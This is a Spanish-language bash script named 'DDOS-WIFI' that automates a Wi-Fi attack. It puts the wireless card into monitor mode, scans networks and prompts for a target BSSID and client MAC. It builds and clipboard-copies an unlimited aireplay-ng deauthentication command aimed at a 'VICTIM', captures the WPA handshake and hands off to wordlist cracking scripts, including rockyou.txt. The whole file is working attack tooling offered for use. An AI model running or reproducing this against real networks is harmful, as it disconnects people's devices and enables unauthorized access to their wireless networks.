#!/bin/bash

rojo='\033[0;31m'
verde='\033[0;32m'
amarillo='\033[0;33m'
azul='\033[0;34m'



trap ctrl_c INT

function ctrl_c(){
	interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')

	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop $interfaz > /dev/null 2>&1; sleep 1
	sudo systemctl restart NetworkManager
	exit 0
}

if [ "$(id -u)" == "0" ]; then
	
	loading_animation3() {
	    local delay=0.1  # Delay entre cada paso
	    local dots=("↷" "↻" "⥁")  # Caracteres para la animación

	    # Definimos algunos colores
	    local colors=( "\033[31m" "\033[32m" "\033[33m" "\033[34m" "\033[35m" "\033[36m" "\033[37m" "\033[0m" ) # Rojo, Verde, Amarillo, Azul, Magenta, Cian, Blanco, Reset
		
	    
	    echo -e "\n\n"
	    while true; do
		  for dot in "${dots[@]}"; do
			# Elegir un color aleatorio
			local color=${colors[RANDOM % ${#colors[@]}]}
			
			
			echo -ne "\r${color}\t\t\t$dot $dot $dot $dot INICIANDO DDOS-WIFI... $dot $dot $dot $dot\033[0m"  
			sleep $delay
		  done
	    done
	}
		
	test=$(sudo iw dev | awk '/type/ { if ($2 == "monitor") print $2}')
	if [ "$test" = "manager" ]; then
		
		sudo clear
		loading_animation3 & 
		sleep 1
		
		echo -e "${azul}"
		echo -e "                  *****************************************************${azul}"
		echo -e "                  * GitHub @ MklMP     💣️    BIENVENIDO A DDOS-WIFI   *${azul}"
		echo -e "                  *****************************************************${rojo}"
		echo -e "                  ***************************** CURRENT MODE: Manager *${rojo}"
		echo -e "                  *****************************************************${amarillo}"
		echo -e "                  * DDOS-WIFI_version: 2.1                       2024 *${amarillo}"
		echo -e "                  *****************************************************${amarillo}"
		
		
		
		
		
	elif [ "$test" = "monitor" ]; then
		sudo clear
		loading_animation3 & 
		sleep 1
		
		echo -e "${azul}"
		echo -e "                  *****************************************************${azul}"
		echo -e "                  * GitHub @ MklMP     💣️    BIENVENIDO A DDOS-WIFI   *${azul}"
		echo -e "                  *****************************************************${verde}"
		echo -e "                  ***************************** CURRENT MODE: Monitor *${verde}"
		echo -e "                  *****************************************************${amarillo}"
		echo -e "                  * DDOS-WIFI_version: 2.1                       2024 *${amarillo}"
		echo -e "                  *****************************************************${amarillo}"
		
		
		
	elif [ "$test" = "AP" ]; then
		sudo clear
		loading_animation3 & 
		sleep 1
		
		echo -e "${azul}"
		echo -e "                  *****************************************************${azul}"
		echo -e "                  * GitHub @ MklMP     💣️    BIENVENIDO A DDOS-WIFI   *${azul}"
		echo -e "                  *****************************************************${verde}"
		echo -e "                  ********************************** CURRENT MODE: AP *${verde}"
		echo -e "                  *****************************************************${amarillo}"
		echo -e "                  * DDOS-WIFI_version: 2.1                       2024 *${amarillo}"
		echo -e "                  *****************************************************${amarillo}"
		
		
		
	fi

	loading_animation4() {
		    local delay=0.1  # Delay entre cada paso
		    local dots=("↷" "↻" "⥁")  # Caracteres para la animación

		    # Definimos algunos colores
		    local colors=( "\033[31m" "\033[32m" "\033[33m" "\033[34m" "\033[35m" "\033[36m" "\033[37m" "\033[0m" ) # Rojo, Verde, Amarillo, Azul, Magenta, Cian, Blanco, Reset
			
		    echo -e "\n\n"
		    while true; do
			  for dot in "${dots[@]}"; do
				# Elegir un color aleatorio
				local color=${colors[RANDOM % ${#colors[@]}]}
				
				echo -ne "\r${color}\t\t\t$dot $dot $dot $dot LOADING (WAIT)... $dot $dot $dot $dot\033[0m"  
				sleep $delay
			  done
		    done
		}

	sudo kill $!
	sudo clear
	
	
	#################################################################################################################
	
		sleep 1
		echo -e "${verde}"
		
		##recolectando nombre de wifi
		echo -e "\n			[❗️]Scaneando Red...\n"
		
		sudo nmcli radio wifi on
		
		sudo nmcli d wifi 
		
		sudo nmcli d wifi >> NMCLI.txt 2>/dev/null
	


		# Encuentra la interfaz wifi
		interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')
		echo -e "\n			[❗️]Indentificando su Interfaz de Red..."
		sleep 1

		###FUNCIONES DEL PROGRAMAAAAAAAAAA#################################################################
		loading_animation() {
		    local delay=0.1  # Delay entre cada paso
		    local dots=("↷" "↻" "⥁")  # Caracteres para la animación

		    # Definimos algunos colores
		    local colors=( "\033[31m" "\033[32m" "\033[33m" "\033[34m" "\033[35m" "\033[36m" "\033[37m" "\033[0m" ) # Rojo, Verde, Amarillo, Azul, Magenta, Cian, Blanco, Reset
			
		    echo -e "\n\n"
		    while true; do
			  for dot in "${dots[@]}"; do
				# Elegir un color aleatorio
				local color=${colors[RANDOM % ${#colors[@]}]}
				
				echo -ne "\r${color}\t\t\t$dot $dot $dot $dot  LOADING (Ctrl+C)... $dot $dot $dot $dot\033[0m"  
				sleep $delay
			  done
		    done
		}
		
		loading_animation2() {
		    local delay=0.1  # Delay entre cada paso
		    local dots=("↷" "↻" "⥁")  # Caracteres para la animación

		    # Definimos algunos colores
		    local colors=( "\033[31m" "\033[32m" "\033[33m" "\033[34m" "\033[35m" "\033[36m" "\033[37m" "\033[0m" ) # Rojo, Verde, Amarillo, Azul, Magenta, Cian, Blanco, Reset
			
		    echo -e "\n\n"
		    while true; do
			  for dot in "${dots[@]}"; do
				# Elegir un color aleatorio
				local color=${colors[RANDOM % ${#colors[@]}]}
				
				echo -ne "\r${color}\t\t\t$dot $dot $dot $dot ABRA UNA NUEVA TERMINAL Y PEGUE SU PORTAPAPELES (ENTER)... $dot $dot $dot $dot\033[0m"  
				sleep $delay
			  done
		    done
		}
		
		
		
		
		#########################################################################################################

		##FUNCION PARA LA CAPTURA DE TRAFICO Y HANDSHAKE ( CASI TOD)
		CapturaTrafico()
		{
			# Captura tráfico
			
			interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')
			
			
			sudo airodump-ng $interfaz 
			kill $!
			echo -e "${azul}"
			echo -e "\n			*** ESTABLECIENDO VALORES ***"
			read -p "			[+]BSSID:" bssid
			read -p "			[+]CHANNEL:" channel
			
			loading_animation &
			sudo airodump-ng --bssid $bssid --channel $channel $interfaz 
			kill $!
			

			
			
			# Ataque de desautentificación
			netSsid=$(grep "$bssid" NMCLI.txt | awk '{print$2, $3, $4}')
			echo -e "\n$azul"
			read -p "			[>/<]Mac de la Estacion:" macStation
			
			comando="sudo airodump-ng -w DDos_Network/crack --bssid $bssid --channel $channel $interfaz"
			comando2="sudo aireplay-ng --deauth 0 -x 100 -a $bssid -c $macStation $interfaz"
			

			
			#UTILES
			sudo clear
			echo -e "${azul}"
			echo -e "                  *****************************************************${azul}"
			echo -e "                  * 💣️ INCIANDO ENVIO DE PAQUETES DE AUTENTICACION 💣️ *${azul}"
			echo -e "                  *****************************************************${verde}"
			echo -e "                        				    ** MODE: Monitor **${verde}"
			echo -e "                  *****************************************************${amarillo}"
			echo -e "                       SPEED: 100 P/s      VICTIM: $netSsid ${amarillo}"
			echo -e "                  *****************************************************${amarillo}"

			echo -e "\n\n\n			[+]Comando Auxiliar Copiado!!"
			
			echo "$comando2" | xclip -selection clipboard

			
			echo -e "\n[↟]Aplicando Dos a($netSsid)"
			sleep 0.5
			echo -e "[↟]Aplicando Dos a($netSsid => $bssid)"
			sleep 0.5
			echo -e "[↟]Aplicando Dos a($netSsid => $bssid => $macStation)"
		
			echo -e "[↟]PERFECTO!! Envie paquetes de autenticacion con el comando del portapapeles!!"
	
			loading_animation2 &
			read -n 1 -r -s -p ""
			kill $!
			$comando #> /dev/null 2>&1
			
			
			while true; do
			
				sudo clear
				echo -e "$amarillo"
				echo -e "\n           		  [!!]Espero que hallas capturado el Handshake!!"
				echo " "
				echo -e "                        ╔═══════════════════════════════════════════╗"
				echo -e "                        ║                                           ║"
				echo -e "                        ║ 1. Crea una Wordlist con nuestro Generador║"
				echo -e "                        ║ 2. Selecciona tu propia Wordlist          ║"
				echo -e "                        ║ 3. Default (rockyou.txt)                  ║"
				echo -e "                        ║                                           ║"
				echo -e "                        ╚═══════════════════════════════════════════╝"
				echo " "
				read -p "                                        Elige un Diccionario: " option
				
				
				
				case $option in
					
					1)
					sudo ./$pwd/GeneratorPass.sh
					exit 50
					;;
					
					
					2)
					sudo ./$pwd/SelectionPass.sh
					exit 50
					;;
						
					3)
					sudo ./$pwd/DefaultPass.sh
					exit 50
					;;
						
					*)
					echo -e "$rojo"
					echo "Opción inválida: -> $option no existe, ignorada" >&2
					sleep 2
					
					;;
					
				esac
			done
		
		
			#Borrar Cache
			read -p "\n				[?]Desea Borrar el Cache antes de salir (y/n):" respuesta
			if [ $respuesta = 'y' ]; then
				
				read -p "			[?]('no' conserva )Desea Borrar el Historial Completo o conservar archivos '.cap' (Contenedores de EAPOL(Key))?? (y/n):" respuesta2
				
				if [ $respuesta2 = 'y' ]; then
				
					rm -f *.netxml 
					rm -f *.csv 
					rm -f *.cap
					 
					
					echo "			[-]HISTORIAL BORRADO EXITOSAMENTE!"
					echo "			Gracias por Usar !"
					ctrl_c
					exit 0
				else
					rm -f *.netxml 
					rm -f *.csv 
					
					echo "			[+]Conservaste los archivos .cap, contenedores de EAPOL(Key)!"
					ctrl_c
					exit 0
				fi
				
			else 
				ctrl_c
				exit 0
			fi 

		}

		

		#Test para el modo monitor
		echo -e "\n			[♻️ ]Testing para la Interfaz de Red..."

		sleep 1
		test=$(sudo iw dev | awk '/type/ { if ($2 == "monitor") print $2}')

		if [[ "$test" = "monitor" ]]; then
			
			echo -e "\n			[✔️ ]La interfaz se cambio a modo (mon)."
			sleep 1
		  	echo -e "\n			[✔️ ]INICIANDO DUMP DUMP in 3"
		  	
		  	loading_animation4 & 
			sudo clear
		  	CapturaTrafico
			kill $!
		  	
			
			
		elif [[ "$test" != "monitor" ]]; then

		  	interfaztest=$(sudo iw dev | grep 'Interface' | awk '{print$2}')
		  	sleep 1
		  	echo -e "\n			[❌️ ]No esta activado el modo monitor($interfaztest)!"
		  	sleep 1
			# Inicia el modo monitor
			loading_animation4 & 
			sleep 3
			sudo airmon-ng start $interfaztest > /dev/null 2>&1
			
			kill $!
			
			sudo clear
			echo -e "${azul}"
			echo -e "                  *****************************************************${azul}"
			echo -e "                  * DDOS-WIFI                BIENVENIDO A DDOS-WIFI   *${azul}"
			echo -e "                  *****************************************************${verde}"
			echo -e "                  ************************************* MODE: Monitor *${verde}"
			echo -e "                  *****************************************************${amarillo}"
			echo -e "                  * DDOS-WIFI_version: 2.1                       2024 *${amarillo}"
			echo -e "                  *****************************************************${amarillo}"

			echo -e "\n			[✔️ ]Iniciando el modo monitor..."
			sleep 1		
			echo -e "\n			[✔️ ]Se activo el modo monitor con EXITO!!"
		  	sleep 1
			echo -e "\n			[✔️ ]La interfaz ya se encuentra en modo Monitor!."
			sleep 2
			
			echo -e "\n			[✔️ ]Reiniciando el Script!"
			if [ -z "$opcion" ]; then
				sleep 1
				echo  -e "\n			[♻️ ]Reiniciando el Script"
				sleep 2
				exec "$0" "$@"
				
			fi
		else
			echo "			[❗️]Comprobando si su equipo soporta el modo monitor..."
			
			scanInterfaces=$(iw list | grep -A 8 "Supported interface modes:" | grep "* monitor")
			
			if [ "$scanInterfaces" = "* monitor" ]; then
				
				echo -e "$verde"
				echo "			[✔️ ]Modo Monitor Soportado por el sistema"
				
				# Inicia el modo monitor
				sudo airmon-ng start $interfaztest > /dev/null 2>&1
				loading_animation4 & 
				sleep 3
				kill $!
				sudo clear
				echo -e "${azul}"
				echo -e "                  *****************************************************${azul}"
				echo -e "                  * DDOS-WIFI                BIENVENIDO A DDOS-WIFI   *${azul}"
				echo -e "                  *****************************************************${rojo}"
				echo -e "                  ************************************* MODE: Manager *${rojo}"
				echo -e "                  *****************************************************${amarillo}"
				echo -e "                  * DDOS-WIFI_version: 2.1                       2024 *${amarillo}"
				echo -e "                  *****************************************************${amarillo}"

				echo -e "\n			[✔️ ]Iniciando el modo monitor..."
				sleep 1		
				echo -e "\n			[✔️ ]Se activo el modo monitor con EXITO!!"
			  	sleep 1
				echo -e "\n			[✔️ ]La interfaz ya se encuentra en modo Monitor!."
				sleep 2
				
				echo -e "\n			[✔️ ]Reiniciando el Script!"
				if [ -z "$opcion" ]; then
					sleep 1
					echo  -e "\n			[♻️ ]Reiniciando el Script"
					sleep 2
					exec "$0" "$@"  
					
				fi
				
			else 
				echo -e "$rojo"
				echo "			[❌️ ]El sistema NO soporta el modo Monitor"
				echo " "
				echo "			Exiting"
				sleep 2
			fi
			
		fi


else	
	echo -e "\n${rojo}[!] Es necesario ser root para ejecutar la herramienta${rojo}"
	echo -e "\n${rojo}[!] Asegurese tambien de habilitar su Wi-Fi${rojo}"
	exit 1
fi










